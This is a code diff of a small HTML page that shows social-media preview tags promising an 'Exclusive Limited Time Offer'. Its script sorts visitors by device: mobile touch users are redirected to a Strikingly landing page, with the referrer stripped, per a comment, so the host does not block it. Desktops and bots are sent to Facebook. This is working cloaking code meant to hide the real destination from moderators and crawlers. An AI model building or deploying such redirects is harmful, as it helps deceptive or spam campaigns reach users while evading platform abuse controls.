@@ -2,23 +2,33 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <meta property="og:title" content="Exclusive Limited Time Offer!">
+    <meta property="og:description" content="Check out our latest collection and grab your discount now.">
+    <meta property="og:image" content="https://images.strikinglycdn.com/static/backgrounds/flowers/flower-background.jpg">
+    <meta property="og:url" content="https://sajusajid587-ship-it.github.io/Saju/">
+    <meta property="og:type" content="website">
+
+    <title>Processing...</title>
+
     <script>
         (function() {
-            // Mobile aur Touch detection
             var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
             var isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
 
             if (isMobile && isTouch) {
-                // MOBILE USER: Seedha landing page par bhej do
+                // Mobile user ke liye no-referrer takay Strikingly block na kare
+                var meta = document.createElement('meta');
+                meta.name = "referrer";
+                meta.content = "no-referrer";
+                document.getElementsByTagName('head')[0].appendChild(meta);
+
                 window.location.replace("https://rose-pigeon-t9wsnt.mystrikingly.com");
             } else {
-                // LAPTOP/BOTS: Foran Facebook par bhej do
                 window.location.replace("https://www.facebook.com");
             }
         })();
     </script>
 </head>
-<body style="background: white;">
+<body>
 </body>
 </html>
